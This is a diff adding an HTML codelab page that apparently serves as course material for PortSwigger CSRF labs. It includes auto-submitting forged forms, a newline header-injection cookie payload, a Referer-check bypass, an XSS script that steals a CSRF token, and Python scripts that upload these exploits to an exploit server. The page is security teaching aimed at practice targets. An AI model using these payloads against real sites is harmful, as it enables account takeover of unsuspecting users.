@@ -1,0 +1,322 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>5.1: CSRF</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W5.1_csrf" title="5.1: CSRF" environment="web" feedback-link="https://docs.google.com/document/d/1NrOCVOReEndKihcFZNyHKWgKpvIOZYefi5AaDK3SCD4">
+<google-codelab-step label="csrf (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank">no-defenses</a></h2>
+<p>When an adversary tricks a user into visiting a site with malicious content embedded in the page, the victim&#39;s browser can be tricked into automatically retrieving the content when rendering the page. In these exercises, an exploit server is loaded with HTML and Javascript for tricking a visitor into submitting a request to a legitimate, but vulnerable web site. The request changes the victim&#39;s e-mail address on the vulnerable site. If the user has logged into that site already, the malicious content will cause the user to have his/her account e-mail address changed.</p>
+<h3 is-upgraded>Examine vulnerable site</h3>
+<p>Visit the site and click on &#34;My account&#34;. Login with the credentials you are given (e.g. <code>wiener / peter</code>). Logging in takes you directly to an account page that allows the user to change their e-mail address. Open the Developer Tools. Right-click the link and inspect the HTML element for the &#34;Update email&#34; button: </p>
+<p class="image-container"><img style="width:267px" src="img/eb13a192a9db18b9.png"> </p>
+<p>The button is associated with the form submission code shown below which POSTs any form data to the <code>/my-account/change-email</code> URI path of the site. Fill in an Email address and click on &#34;<code>Update email</code>&#34;. In Developer Tools, view the request that is generated to get the URL that changes the e-mail address on the vulnerable site including its request headers and payload.</p>
+<p class="image-container"><img style="width:624px" src="img/bd533fce1d1aba56.png"></p>
+<p>The request to the vulnerable site (<code>vulnerable-website.com</code>) has the following format:</p>
+<pre>POST /my-account/change-email HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=wiener@normal-user.com</pre>
+<h3 is-upgraded>CSRF exploit</h3>
+<p>The form does not employ a CSRF token that binds the form submission to a previously issued HTML form, thus making it vulnerable to attack. If the exploit server has the following HTML, then a victim that is logged into the vulnerable site will post the request to change his/her e-mail address to <code>pwned@evil-user.net</code> automatically via Javascript.</p>
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+        &lt;form action=&#34;https://vulnerable-website.com/my-account/change-email&#34; method=&#34;POST&#34;&gt;
+          &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@evil-user.net&#34;&gt;
+        &lt;/form&gt;
+        &lt;script&gt;
+          document.forms[0].submit();
+        &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Examine exploit site</h3>
+<p>Visit the exploit server that will be used to host the exploit.</p>
+<p class="image-container"><img style="width:439.5px" src="img/f5ecbc6c993a0110.png"></p>
+<p>The exploit server allows you to store HTML content at <code>/exploit</code> that the victim will automatically visit. Visit the exploit site and bring up Developer Tools. &#34;Store&#34; the default content (<code>Hello, world!</code>) that is given and view the form submission parameters.</p>
+<p class="image-container"><img style="width:480px" src="img/a59ac5079194c9de.png"></p>
+<p>The <code>responseBody</code> of this form submission can contain the HTML exploit previously given. When an appropriate exploit has been developed, storing the exploit here will solve the level.</p>
+<h3 is-upgraded>Solve using Python</h3>
+<p>We will perform the solution using a Python script to submit the exploit to the exploit server. The snippet below visits the site and pulls out the URL for the exploit server from it. </p>
+<pre><code>s = requests.Session()
+url = f&#39;https://{site}/&#39;
+resp = s.get(url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+exploit_url = soup.find(&#39;a&#39;, {&#39;id&#39;:&#39;exploit-link&#39;}).get(&#39;href&#39;)</code></pre>
+<p>Then craft your exploit HTML from the example previously given, replacing the form&#39;s action attribute appropriately:</p>
+<pre><code># &lt;FMI&gt; (Fill Me In) denotes a value you will need to modify
+
+exploit_html = f&#39;&#39;&#39;&lt;html&gt;
+  . . .
+  &lt;form action=&#34;&lt;FMI&gt;&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@evil-user.net&#34;&gt;
+  . . .
+&lt;/html&gt;&#39;&#39;&#39;</code></pre>
+<p>We can now upload and store the exploit. Based on the inspection of the form submission request, fill in the appropriate <code>formData</code> below and POST it to the exploit server to store the HTML exploit and solve the level.</p>
+<pre><code>formData = {
+    &#39;urlIsHttps&#39;: &#39;on&#39;,
+    &#39;responseFile&#39;: &#39;/exploit&#39;,
+    &#39;responseHead&#39;: &#39;HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8&#39;,
+    &#39;responseBody&#39;: exploit_html,
+    &#39;&lt;FMI&gt;&#39;: &#39;&lt;FMI&gt;&#39;
+}
+resp = s.post(exploit_url, data=formData)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="csrf (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method" target="_blank">token-validation-depends-on-request-method</a> </h2>
+<p>Visit the site and click &#34;My account&#34; to log in using the given credentials (<code>wiener:peter</code>). Then, using the prior level&#39;s Python script, upload the prior level&#39;s exploit to the exploit server. After storing the exploit, visit the exploit server in a web browser and click on &#34;View exploit&#34;.</p>
+<ul>
+<li><strong>Take a screenshot of the result showing that the exploit has failed</strong></li>
+</ul>
+<p>When attempting to prevent CSRF attacks, one must ensure all routes and all HTTP methods used on those routes are protected with CSRF tokens. In this case, POST requests are protected, causing our prior exploit to fail. Change the form submission method from a POST to a GET and re-run the script to upload the exploit. As the results should indicate, using a GET method on the change-email request bypasses the CSRF protection and solves the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="csrf (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session" target="_blank">token-not-tied-to-user-session</a> </h2>
+<p>It is important that CSRF tokens are bound to the session of the authenticated user they are given to. If an adversary has an account on the vulnerable site and obtains a CSRF token, that token should not be usable if submitted by a different user. In this level, the change email functionality is protected by a CSRF token as shown below:</p>
+<p class="image-container"><img style="width:624px" src="img/43456c3793ae8c88.png"></p>
+<p>We can attempt to exploit a victim by first obtaining a CSRF token for ourselves as performed in the Python code below:</p>
+<pre><code>change_url = f&#39;https://{site}/my-account&#39;
+resp = s.get(change_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)</code></pre>
+<p>Then, in the exploit HTML, we can insert the token in hopes that it will work for the victim that visits the exploit site.</p>
+<pre><code>exploit_html = f&#39;&#39;&#39;&lt;html&gt;
+  . . .
+  &lt;form . . .&gt;
+     . . .
+     &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@evil-user.net&#34;&gt;
+     &lt;input type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;{csrf}&#34;&gt;
+     . . .
+  &lt;/form&gt;
+&lt;/html&gt;&#39;&#39;&#39;</code></pre>
+<p>In this level, as any valid CSRF token will be accepted by the vulnerable site, uploading the exploit above will solve the level. Modify the script from the previous levels to extract the CSRF token, upload the <code>exploit_html</code> to the exploit site, and solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="csrf (4)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie" target="_blank">token-duplicated-in-cookie</a> </h2>
+<p>The site in this lab contains two vulnerabilities that can be chained together to exploit a victim via cross-site request forgery.</p>
+<h3 is-upgraded>Header injection vulnerability</h3>
+<p>The first vulnerability is a header injection attack similar to XSS. In XSS, input that a client has provided is sent back within the HTML of a subsequent response. The header injection vulnerability is similar, but the input is reflected back in the HTTP headers of a subsequent response. Begin by visiting the site and bringing up Developer Tools. Submit a search using your OdinId as a search term. Click on the &#34;Network&#34; tab and then on the request. Finally, click on &#34;Headers&#34; for the request and expand the &#34;Response Headers&#34;.</p>
+<ul>
+<li><strong>Take a screenshot of the entire HTTP response header that includes your OdinId</strong></li>
+</ul>
+<p>Whenever user input is reflected back into header fields of an HTTP response, one must ensure that the newline characters (<code>\n</code> or its URL-encoded format <code>%0d%0a</code>) are escaped. Since HTTP response headers are separated by a newline, blindly allowing user input to be included can allow someone to inject a bogus header field.</p>
+<p>Consider the Python function below that performs the search above programmatically and prints the contents of the returning HTTP response headers:</p>
+<pre><code>def getHeadersFromSearch(search_term):
+    resp = requests.get(f&#34;https://{site}/?search={search_term}&#34;)
+    for header in resp.headers.items():
+        print(header)</code></pre>
+<p>Run the function using your OdinId as a search term to see that it returns a similar response.</p>
+<pre><code>getHeadersFromSearch(&#34;&lt;FMI&gt;&#34;)</code></pre>
+<ul>
+<li><strong>How many cookies are returned? What are their names?</strong></li>
+</ul>
+<p>Then, run it with a newline after your OdinId:</p>
+<pre><code>getHeadersFromSearch(&#34;&lt;FMI&gt;\nfoo: bar&#34;)</code></pre>
+<ul>
+<li><strong>How have </strong><strong><code>foo</code></strong><strong> and </strong><strong><code>bar</code></strong><strong> been interpreted?</strong></li>
+</ul>
+<p>Finally, run it with a newline after your OdinId and attempt to include a header that sets a cookie in the response.</p>
+<pre><code>getHeadersFromSearch(&#34;wuchang\nSet-Cookie: foo=bar&#34;)</code></pre>
+<ul>
+<li><strong>How many cookies have been returned?</strong></li>
+</ul>
+<p>The implications of this vulnerability is that an adversary can now tamper with the cookies on a client by tricking the client into performing a malicious search on the vulnerable site.</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Cookie vulnerability</h3>
+<p>The second vulnerability is that the server stores the client&#39;s CSRF token in a cookie and trusts that the client will not tamper with it. To see how cookies are handled in this application, examine the Python code below that visits the login page, parses out the CSRF token in both the HTML being returned as well as the &#39;<code>Set-Cookie:</code>&#39; HTTP response header.</p>
+<pre><code>s = requests.Session()
+login_url = f&#39;https://{site}/login&#39;
+resp = s.get(login_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+print(f&#39; csrf field in form field: {csrf}&#39;)
+for header in resp.headers.items():
+    print(header)</code></pre>
+<p>Then, examine the session&#39;s cookie jar to see the cookie containing the CSRF token.</p>
+<pre><code>for cookie in s.cookies.items():
+    print(cookie)</code></pre>
+<p>Finally, delete the cookies from the session and attempt to login to the site with the credentials given and with the prior CSRF token included in the form submission, but without the associated cookie containing the CSRF token.</p>
+<pre><code>s.cookies.clear()
+logindata = {
+    &#39;csrf&#39; : csrf,
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;password&#39; : &#39;peter&#39;
+}
+resp = s.post(login_url, data=logindata)
+print(f&#34;HTTP status code {resp.status_code} with text {resp.text}&#34;)</code></pre>
+<ul>
+<li><strong>Explain the results. Give one reason why a developer would choose to implement CSRF protection in this manner</strong></li>
+</ul>
+<p>If the web application validates a submission by ensuring that the cookie&#39;s CSRF token matches the <code>csrf</code> field in the form submission, it must make sure that such a token can not be forged. To test whether this is the case, in the Python code below, fill in your OdinId for the CSRF token in both the cookie and the form submission fields. Then run the code.</p>
+<pre><code>logindata = {
+    &#39;csrf&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;password&#39; : &#39;peter&#39;
+}
+cookiedata = {
+    &#39;csrf&#39; : &#39;&lt;FMI&gt;&#39;
+}
+resp = requests.post(login_url, data=logindata, cookies=cookiedata)
+print(f&#34;HTTP status code {resp.status_code}&#34;)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+print(f&#34;CSRF token in HTML response is {csrf}&#34;)</code></pre>
+<ul>
+<li><strong>What status code is returned? What is the value of the </strong><strong><code>csrf</code></strong><strong> field in the HTML form that is given back as a response?</strong></li>
+</ul>
+<p>Keyed hash functions, where the key is kept secret, are one way to ensure that the token can not be fabricated.</p>
+<ul>
+<li><strong>How might a developer use a keyed hash function on the server to prevent this request from succeeding without being forced to store each token?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Developing an initial exploit</h3>
+<p>We can now develop an exploit that combines the two vulnerabilities together. As in prior levels, an exploit server is given to us that hosts content that an authenticated victim will periodically access. We first craft a search URL that will be hosted on the exploit server for the victim to request. While URLs sent via Python&#39;s requests package are automatically URL-encoded, we are embedding this link in the HTML page and must URL-encode it ourselves. The <code>urllib.parse.quote_plus()</code> function will perform the appropriate encoding. In this case, the URL will set the CSRF cookie to &#39;<code>foo</code>&#39;. Note that we will also want to set the SameSite attribute for the CSRF cookie to &#34;None&#34; to trick the browser into allowing cookies to be sent from the exploit server to the level web site.</p>
+<pre><code>import urllib
+search_term = urllib.parse.quote(&#34;wuchang\nSet-Cookie: csrf=foo; SameSite=None&#34;)
+search_url = f&#39;https://{site}/?search={search_term}&#39;
+print(f&#39;URL to embed ({search_url})&#39;)</code></pre>
+<p>With this, we can now craft the page to perform the search and cause the victim to login using the initial account we have been given. Consider the HTML below. It recreates the login form with the CSRF token &#39;<code>foo</code>&#39; and presets the <code>username</code> and <code>password</code> fields to the credentials given for the level. It then creates a single &lt;<code>img</code>&gt; element and points its <code>src</code> attribute to the search URL. The victim automatically fetches this URL setting the CSRF cookie to <code>foo</code>. Since the URL does not contain an image to render, the browser will immediately generate an error. By pointing the <code>onerror</code> event attribute to Javascript code that submits the login form, we then cause the victim to automatically login.</p>
+<pre><code>exploit_html = f&#39;&#39;&#39;
+    &lt;form action=&#34;{login_url}&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;username&#34; value=&#34;wiener&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#34;peter&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;foo&#34;&gt;
+    &lt;/form&gt;
+    &lt;img src=&#34;{search_url}&#34; onerror=&#34;document.forms[0].submit();&#34;&gt;
+&#39;&#39;&#39;</code></pre>
+<p>Using the script from the initial level, store this page on the exploit server. Then, without logging in to the vulnerable site, visit the exploit server and &#34;View exploit&#34;. The page should initially render a broken image before redirecting you to another page.</p>
+<ul>
+<li><strong>Take a screenshot of the page that you are sent to for your lab notebook </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h3 is-upgraded>Exploit level</h3>
+<p>In this level, a victim has already authenticated to the vulnerable site. Without knowing the victim&#39;s credentials, our goal is to trick the victim into changing their e-mail address. The victim will visit the exploit server periodically to render whatever content that is placed there. We can modify our initial exploit to trick the victim into sending a request to change their e-mail address instead. As shown in the HTML below, the form to submit an e-mail change is implemented with the CSRF field set to <code>foo</code>. Use it to solve the level.</p>
+<pre><code>exploit_html = f&#39;&#39;&#39;
+    &lt;form action=&#34;{change_email_url}&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@evil-user.net&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;foo&#34;&gt;
+    &lt;/form&gt;
+    &lt;img src=&#34;{search_url}&#34;
+    onerror=&#34;document.forms[0].submit();&#34;&gt;
+&#39;&#39;&#39;</code></pre>
+<p>Note, if you have uploaded and demonstrated a working exploit and the level does not accept the solution, it may need to be reset.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="csrf (5)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/csrf/lab-referer-validation-broken" target="_blank">referer-validation-broken</a> </h2>
+<p>In this level, the site protects against CSRF attacks by attempting to identify the source page in which the login attempt originates. As with previous levels, the login form is hosted at <code>https://{site}/login</code> which is also the URL that the login credentials are sent via POST when the form is submitted. The HTTP <code>Referer:</code> request header attaches the page that the client is on when it sends the POST request. </p>
+<h3 is-upgraded>Validation logic</h3>
+<p>Begin by bringing up the login page for the site. Inspect the form in Developer Tools and see that it does not contain a CSRF field. With the console still up, login using the credentials given in the lab (<code>wiener:peter</code>). Then, navigate to the &#34;Network&#34; tab, find the POST request, and expand out its HTTP request headers. Make a note of the <code>Referer:</code> header that is attached.</p>
+<p class="image-container"><img style="width:624px" src="img/b5c5bd8bf6dbce24.png"></p>
+<p>Then, attempt to login via a Python script. Because the request is done via the program, the <code>Referer:</code> header is not set. </p>
+<pre><code>login_url = f&#39;https://{site}/login&#39;
+logindata = {
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;password&#39; : &#39;peter&#39;
+}
+resp = requests.post(login_url, data=logindata)
+print(f&#39;HTTP status code: {resp.status_code} with response text {resp.text}&#39;)</code></pre>
+<ul>
+<li><strong>What status code and response text is returned?</strong></li>
+</ul>
+<p>We can set the HTTP request headers for our Python script by sending in a dictionary specifying the headers to include and their values. This is sent in the headers keyword argument as shown below for the <code>Referer:</code> header. Modify the code to include the URL found previously in the <code>Referer:</code> field.</p>
+<pre><code>resp = requests.post(login_url, data=logindata, headers={&#39;referer&#39; : &#39;&lt;FMI&gt;&#39;})</code></pre>
+<ul>
+<li><strong>What status code is returned?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Exploit level</h3>
+<p>With the <code>Referer:</code> request header being the only mechanism that is in place to prevent CSRF attacks, an adversary only needs to tamper with the victim&#39;s headers to perform the exploit. As in prior levels, an exploit server is given that the client visits periodically. Begin by modifying the HTML below for your level and storing it on the exploit server. </p>
+<pre><code>exploit_html = f&#39;&#39;&#39;&lt;html&gt;
+  &lt;body&gt;
+  &lt;form action=&#34;https://{site}/my-account/change-email&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@evil-user.net&#34; /&gt;
+  &lt;/form&gt;
+  &lt;script&gt;
+    document.forms[0].submit();
+  &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;&#39;&#39;&#39;</code></pre>
+<p>Visit the site and login using the credentials given (<code>wiener:peter</code>). Then, visit exploit server and click on &#34;View exploit&#34;. </p>
+<ul>
+<li><strong>Take a screenshot of the page that is returned including its URL</strong></li>
+</ul>
+<p>In Javascript, one can modify the browser&#39;s history programmatically. The code below appends a search term onto the URL of the browser&#39;s current page and sets it to the URL of the page that changes an account&#39;s email address. This may be sufficient to trick the server into allowing the request. Modify the Javascript to point to your site&#39;s change email URL and then add the code to the script in <code>exploit_html</code>.</p>
+<pre><code>    history.pushState(&#34;&#34;, &#34;&#34;, &#34;/?{referer_url}&#34;)</code></pre>
+<p>It turns out that modern browsers strip this query string from the <code>Referer:</code> header by default as a security measure. To override this behavior, the exploit server must be configured to instruct browsers to allow query strings to be sent in the field. For the exploit server, this is done by adding the <code>Referrer-Policy: unsafe-url</code> field to the exploit server&#39;s HEAD response. This is done by modifying the form submission when uploading the exploit.</p>
+<pre><code>formData = {
+    &#39;urlIsHttps&#39;: &#39;on&#39;,
+    &#39;responseFile&#39;: &#39;/exploit&#39;,
+    &#39;responseHead&#39;: &#39;HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nReferrer-Policy: unsafe-url&#39;,
+    &#39;responseBody&#39;: exploit_html,
+    &#39;formAction&#39;: &#39;STORE&#39;
+}
+resp = s.post(exploit_url, data=formData)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/exploiting" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf" target="_blank">perform-csrf</a> </h2>
+<p>To protect against CSRF attacks, requests are bound with a unique token. This makes it difficult for an adversary to perform the attack unless more access or control over the authenticated victim browser is obtained. Such access and control, however, is enabled when the vulnerable site contains an XSS vulnerability. By allowing the adversary to execute arbitrary Javascript on the victim, the adversary can trick the victim to perform two requests, one to retrieve the CSRF token and another to perform the exploit.</p>
+<p>Visit the site and see that it supports commenting on blog posts (as seen in the XSS levels) as well as login functionality as seen before. The goal of this level is to deliver an XSS attack that tricks the victim into changing their e-mail address automatically. Consider the Javascript below if it were delivered to a victim. The script creates an AJAX request and registers a function (<code>handleResponse</code>) that should be called upon loading the request. It then retrieves the <code>/my-account</code> page.</p>
+<pre><code>&lt;script&gt;
+  var req = new XMLHttpRequest();
+  req.onload = handleResponse;
+  req.open(&#39;get&#39;,&#39;/my-account&#39;,true);
+  req.send();
+
+  function handleResponse() {
+    // Code to execute after request loads
+  };
+&lt;/script&gt;</code></pre>
+<p>Once the request finishes loading, the <code>handleResponse()</code> function is called. The function searches for the <code>csrf</code> token embedded in the response HTML and parses it out using a regular expression. It then creates a second AJAX request to POST a <code>change-email</code> request that includes the token and the address we want the victim&#39;s account to be changed to.</p>
+<pre><code>  function handleResponse() {
+    var token = this.responseText.match(/name=&#34;csrf&#34; value=&#34;(\w+)&#34;/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open(&#39;post&#39;, &#39;/my-account/change-email&#39;, true);
+    changeReq.send(&#39;csrf=&#39;+token+&#39;&amp;email=test@test.com&#39;)
+  };</code></pre>
+<p>Post the script as a comment to the blog. A victim browser is programmed to access the blog posts periodically which will trigger an address change automatically and solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
